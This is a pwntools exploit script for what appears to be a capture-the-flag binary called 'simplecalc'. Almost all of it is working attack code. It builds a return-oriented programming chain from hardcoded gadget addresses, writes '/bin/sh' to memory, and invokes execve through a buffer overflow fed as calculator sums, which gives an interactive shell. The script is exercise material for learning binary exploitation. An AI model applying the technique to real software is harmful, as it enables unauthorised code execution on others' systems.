#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./simplecalc
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './simplecalc')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

context.log_level = 'DEBUG'

popRAX = 0x44db34
popRDX = 0x437a85
popRDI = 0x401b73
popRSI = 0x401c87
mov_MEMrdi_dl = 0x42b923
syscall = 0x400488

writable_mem = 0x6c1060

shell = b"/bin/sh\x00"

rop = b""

# Write /bin/sh to memory
for i in range(len(shell)):
    rop += p64(popRDX)
    rop += p64(shell[i])
    rop += p64(popRDI)
    rop += p64(writable_mem + i)
    rop += p64(mov_MEMrdi_dl)

# Load values for execve syscall
rop += p64(popRAX)
rop += p64(59)
rop += p64(popRDI)
rop += p64(writable_mem)
rop += p64(popRSI)
rop += p64(0)
rop += p64(popRDX)
rop += p64(0)

rop += p64(syscall)

# Build payload for buffer overflow

def add2get(num):
    global io
    io.sendline(b"1")
    io.recvuntil(": ")
    io.sendline(str(num+40).encode())
    io.recvuntil(": ")
    io.sendline(b"-" + str(40).encode())
    io.recvuntil(b"=> ")

io = start()
io.recvuntil(b"calculations: ")
io.sendline(b"200")
io.recvuntil(b"=> ")

for _ in range(18):
    add2get(0)

group_by_4B = [rop[i:i+4] for i in range(0, len(rop), 4)]

for i,group in enumerate(group_by_4B):
    add2get(int.from_bytes(group, 'little'))
    print(i)

io.sendline(b"5\n")
io.interactive()

